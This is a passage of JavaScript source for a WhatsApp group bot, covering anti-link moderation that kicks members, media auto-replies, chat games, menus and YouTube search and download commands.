			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

       //auto reply by xeon
  //if (Autoreply) //remove forwad slashes to make it autoreply on off
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
					XeonBotInc.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
					XeonBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
					XeonBotInc.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
					XeonBotInc.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: XeonBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
XeonBotInc.ev.emit('messages.upsert', msg)
}

//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    XeonBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Don't tag him!
He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
During ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
        //menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

//💝💝💝💝💝💝\\
//swtich case
        switch(command) {
case 'alive': case 'menu': case 'panel': {
    XeonBotInc.sendMessage(from, { react: { text: `🦁`, key: m.key }}) 
    let buttons = [
    {buttonId: `bbb`, buttonText: {displayText: '☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒'}, type: 1},
    {buttonId: `allmenu`, buttonText: {displayText: '📚𝐀𝐋𝐋 𝐌𝐄𝐍𝐔📚'}, type: 1},
    {buttonId: `rateus`, buttonText: {displayText: '✨𝚁𝙰𝚃𝙴_𝚄𝚂✨'}, type: 1}
    ]
    let buttonMessage = {
    image: { url: `${global.alivepic}` },
    caption: `*හායි ${pushname}*\n *I AM ALIVE NOW*\n *☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒\n❤️❤️❤️❤️❤️\n${ucapanWaktu}\n${global.alivemsg}`,
    footer: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒`,
    buttons: buttons,
    headerType: 4,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break
 case 'setalivemsg':{
 if (!isCreator) return m.reply(`${mess.owner}`)
 if (!text) return reply(`මෙය කල හැක්කේ මාගෙ අයිතිකරුට පමනි`)
 XeonBotInc.sendMessage(from, { react: { text: `⚙️`, key: m.key }})
   global.alivemsg = text
   m.reply("🌍🔗alive masege එක වෙනස් කරා🔗🌍")
}
break
 case 'setalivepic':{
 if (!isCreator) return m.reply(`${mess.owner}`)
 if (!text) return reply(`මෙය කල හැක්කේ මාගෙ අයිතිකරුට පමනි`)
 XeonBotInc.sendMessage(from, { react: { text: `⚙️`, key: m.key }})
   global.alivepic = text
   m.reply("🌍🔗alive picture එක වෙනස් කරා🔗🌍")
}
break
case 'owner': case 'creator': case 'moderator': case 'mod': {
XeonBotInc.sendMessage(from, { react: { text: `🙋`, key: m.key }})
XeonBotInc.sendContact(m.chat, owner, m)
}
            break
case 'ratestar': case 'rateus': case 'rate': {
    XeonBotInc.sendMessage(from, { react: { text: `✡️`, key: m.key }}) 
    let buttons = [
    {buttonId: `1star`, buttonText: {displayText: '😊★★★★★😊'}, type: 1},
    {buttonId: `2star`, buttonText: {displayText: '😐★★★😐'}, type: 1},
    {buttonId: `3star`, buttonText: {displayText: '😒★😒'}, type: 1}
    ]
    let buttonMessage = {
    image: { url: `https://i.ibb.co/0qyRJvQ/Picsart-23-01-24-16-24-18-396.jpg` },
    caption: `හායි ${pushname}\n*★𝐑𝐀𝐓𝐄 𝐔𝐒★*\n*𝐒𝐄𝐋𝐄𝐂𝐓 𝐘𝐎𝐔𝐑 𝐑𝐀𝐓𝐄 𝐒𝐓𝐀𝐑*`,
    footer: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒`,
    buttons: buttons,
    headerType: 4,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
 break
            case '3star': {
            XeonBotInc.sendMessage(from, { react: { text: `😒`, key: m.key }})
                XeonBotInc.sendMessage(from, { text: `*★ඔය එක තරුව තියල ඉදගනින්😒*` }, { quoted: m })
            }
            break
            case '2star': {
            XeonBotInc.sendMessage(from, { react: { text: `😐`, key: m.key }})
                XeonBotInc.sendMessage(from, { text: `*★★★thanks your rate😐*` }, { quoted: m })
            }
            break
            case '1star': {
            XeonBotInc.sendMessage(from, { react: { text: `☺️`, key: m.key }})
                XeonBotInc.sendMessage(from, { text: `*☺️★★★★★\n𝚃𝙷𝙰𝙽𝙺𝚂 𝚈𝙾𝚄𝚁 𝚁𝙰𝚃𝙴☺️*` }, { quoted: m })
            }
            break
case 'allmenu': {
    XeonBotInc.sendMessage(from, { react: { text: `📜`, key: m.key }}) 
    let buttons = [
    {buttonId: `bbb`, buttonText: {displayText: '☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒'}, type: 1},
    {buttonId: `allmenu`, buttonText: {displayText: '📚𝐀𝐋𝐋 𝐌𝐄𝐍𝐔📚'}, type: 1},
    {buttonId: `rateus`, buttonText: {displayText: '✨𝚁𝙰𝚃𝙴_𝚄𝚂✨'}, type: 1}
    ]
    let buttonMessage = {
    image: { url: `https://i.ibb.co/CMCNByx/Picsart-22-07-03-15-45-00-698.jpg` },
    caption: `╒ ☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒☷▕━⛟
┠──☾owner☽────◑
┃${global.menuimoji}owner
┃${global.menuimoji}setalivepic
┃${global.menuimoji}setalivemsg
┃${global.menuimoji}antikall
┃${global.menuimoji}join
┃${global.menuimoji}leavegc
┃${global.menuimoji}block
┃${global.menuimoji}unblock
┠──☾Group☽────◑
┃${global.menuimoji}add
┃${global.menuimoji}kick
┃${global.menuimoji}tagall
┃${global.menuimoji}antilink
┃${global.menuimoji}antitoxic
┃${global.menuimoji}antiwame
┃${global.menuimoji}antilinkfb
┃${global.menuimoji}antilinktiktok
┃${global.menuimoji}antilinktwitter
┃${global.menuimoji}antilinkyoutubech
┃${global.menuimoji}antilinkyoutubevideo
┃${global.menuimoji}antilinkinstagram
┃${global.menuimoji}antilinktelegram
┠──☾media☽────◑
┃${global.menuimoji}song
┃${global.menuimoji}video
┃${global.menuimoji}mediafire
┃${global.menuimoji}fb
┃${global.menuimoji}tiktok
┃${global.menuimoji}ehi
┃${global.menuimoji}img
┃${global.menuimoji}spotify
┃${global.menuimoji}instagram
┃${global.menuimoji}serchsong
┃${global.menuimoji}serchvideo
┃${global.menuimoji}apk
┃${global.menuimoji}film
┃${global.menuimoji}lyrics
┠─☾Logo packs☽───◑
┃${global.menuimoji}logo1
┃${global.menuimoji}logo2
┃${global.menuimoji}logo3
┠─☾covert☽─────◑
┃${global.menuimoji}sticker
┃${global.menuimoji}translate
┃${global.menuimoji}tomp3
┠─☾other☽─────◑
┃${global.menuimoji}alive
┃${global.menuimoji}script
┃${global.menuimoji}allmenu
┃${global.menuimoji}rate
┃${global.menuimoji}
┗━━━━━━━━━━━⛟`,
    footer: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒`,
    buttons: buttons,
    headerType: 4,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
 break
case 'bbb': case 'pn': case 'script': {
    XeonBotInc.sendMessage(from, { react: { text: `⚙️`, key: m.key }}) 
    let buttons = [
    {buttonId: `alive`, buttonText: {displayText: '𝐀𝐋𝐈𝐕𝐄'}, type: 1},
    {buttonId: `owner`, buttonText: {displayText: '𝐎𝐖𝐍𝐄𝐑'}, type: 1}
    ]
    let buttonMessage = {
    image: { url: `https://i.ibb.co/bH371tY/Picsart-22-10-02-11-18-47-805.jpg` },
    caption: `*▕☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒▕*

*🪀𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐂𝐇𝐀𝐍𝐄𝐋 𝐋𝐈𝐍𝐊🪀*
https://youtube.com/channel/UCOlt2_XK6tS2KJn6fTdpPew

*🪀𝐁𝐎𝐓 𝐒𝐂𝐑𝐈𝐏𝐓 𝐋𝐈𝐍𝐊🪀*
https://sites.google.com/view/pramesh-lion-bot/%E0%B6%B1%E0%B7%80%E0%B7%83?read_current=1

*🪀𝐁𝐎𝐓 𝐇𝐄𝐋𝐏𝐈𝐍𝐆 𝐆𝐑𝐎𝐔𝐏🪀*
https://chat.whatsapp.com/FDpARRbNUKjLkfbm2xRv2M

💠💠💠💠💠💠💠💠💠💠💠
*⃦ 𝐓𝐇𝐀𝐍𝐊𝐒 ⃦*`,
    footer: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒`,
    buttons: buttons,
    headerType: 4,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
            break
case 'ytmp3': case 'ytaudio': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) throw `Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
const audio=await xeonaudp3.mp3(text)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
	    case 'ytmp3xx': case 'ytaudioxx': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                XeonBotInc.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
                XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
case 'ytmp4': case 'ytvideo': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) throw `Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
break
case 'ytdoc': {
XeonBotInc.sendMessage(from, { react: { text: `📂`, key: m.key }})
let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
const auddown = await XeonBotInc.sendMessage(from , { text: '📥 Downloading Your Song...' }, { quoted: m } )
    await XeonBotInc.sendMessage(from, { delete: auddown.key })
    const audup = await XeonBotInc.sendMessage(from , { text: '📤 Uploading Your Song...' }, { quoted: m } )
    const aud = await XeonBotInc.sendMessage(m.chat, {document:{url:media.dl_link}, mimetype:"audio/mpeg", fileName: `${media.title}.mp3`}, { quoted: m }) .catch((err) => reply(mess.error))
    await XeonBotInc.sendMessage(from, { delete: audup.key })               
    }
break
case 'vd': case 'serchvideo': { 
XeonBotInc.sendMessage(from, { react: { text: `🔎`, key: m.key }})
if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
m.reply(mess.wait)
            let ytsvideo = require("youtube-yts")
            let videosearch = await ytsvideo(text)
            listSerch = []
            teskd = `\nSearched Video: ${text}\n`
            for (let i of videosearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp4 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            let sections = [
                {
                    title: "Top " + videosearch.all.length + " videos thats matches search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "Videos",
                mentions: parseMention(teskd), sections
            }
            return XeonBotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
        break    
        case 'sg': case 'serchsong': {
XeonBotInc.sendMessage(from, { react: { text: `🔎`, key: m.key }})
        if (!text) return m.reply(`Example : ${prefix + command} stay jb`)
        m.reply(mess.wait)
            let ytslagu = require("youtube-yts")
            let lagusearch = await ytslagu(text)
            listSerch = []
            teskd = `Searched Song: ${text}\n`
            for (let i of lagusearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp3 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            const sections = [
                {
                    title: "Top " + lagusearch.all.length + " songs that matched search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "Songs",
                mentions: parseMention(teskd), sections
            }
            return XeonBotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
            break
            case 'song': case 'ytsg':{
    XeonBotInc.sendMessage(from, { react: { text: `🎧`, key: m.key }})
                if (!text) throw `Example : ${prefix + command} anime whatsapp status`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[0]
                let buttons = [
    {buttonId: `pnpn ${anulay.url}`, buttonText: {displayText: '⬇️𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳⬇️'}, type: 1},
    {buttonId: `sg ${text}`, buttonText: {displayText: '🔎𝚂𝙴𝙻𝙴𝙲𝚃_ˢᵃᵐᵉ𝚂𝙾𝙽𝙶🔎'}, type: 1},
    {buttonId: `rateus`, buttonText: {displayText: '✡️𝐑𝐀𝐓𝐄_𝐔𝐒✡️'}, type: 1}
    ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `
┏━━━━━━━━━━━━━꧂
┃*☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒*┃
┃◈━━━━━━━━━━━━◈
┃  📥SONG DOWNLOADER📥
┃      ◈━━━━━━━◈
┃🎬Title : ${anulay.title}
┃⏳Duration : ${anulay.timestamp}
┃👁️‍🗨️Viewers : ${anulay.views}
┃⏰Upload At : ${anulay.ago}
┃🔮Author : ${anulay.author.name}
┃🎀Channel : ${anulay.author.url}
┃🔗Url : ${anulay.url}
┗━━━━━━━━━━━━━꧂`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'video': case 'ytvd':{
    XeonBotInc.sendMessage(from, { react: { text: `📽️`, key: m.key }})
                if (!text) throw `Example : ${prefix + command} anime whatsapp status`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[0]
                let buttons = [
    {buttonId: `ytmp4 ${anulay.url}`, buttonText: {displayText: '⬇️𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳⬇️'}, type: 1},
    {buttonId: `vd ${text}`, buttonText: {displayText: '🔎𝚂𝙴𝙻𝙴𝙲𝚃_ˢᵃᵐᵉ𝚅𝙸𝙳𝙴𝙾🔎'}, type: 1},
    {buttonId: `rateus`, buttonText: {displayText: '✡️𝐑𝐀𝐓𝐄_𝐔𝐒✡️'}, type: 1}
    ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `
┏━━━━━━━━━━━━━꧂
┃*☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒*┃
┃◈━━━━━━━━━━━━◈
┃  📥VIDEO DOWNLOADER📥
┃      ◈━━━━━━━◈
┃🎬Title : ${anulay.title}
┃⏳Duration : ${anulay.timestamp}
┃👁️‍🗨️Viewers : ${anulay.views}
┃⏰Upload At : ${anulay.ago}
┃🔮Author : ${anulay.author.name}
┃🎀Channel : ${anulay.author.url}
┃🔗Url : ${anulay.url}
┗━━━━━━━━━━━━━꧂`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }        
        break
            case 'pnpn': {
    XeonBotInc.sendMessage(from, { react: { text: `📑`, key: m.key }})
                if (!text) throw `Example : ${prefix + command} anime whatsapp status`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[0]
                let buttons = [
    {buttonId: `ytmp3 ${anulay.url}`, buttonText: {displayText: '🎼mp3🎼'}, type: 1},
    {buttonId: `ytdoc ${anulay.url}`, buttonText: {displayText: '📂document📂'}, type: 1},
    {buttonId: `rateus`, buttonText: {displayText: '✡️𝐑𝐀𝐓𝐄_𝐔𝐒✡️'}, type: 1}
    ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `
┏━━━━━━━━━━━━━꧂
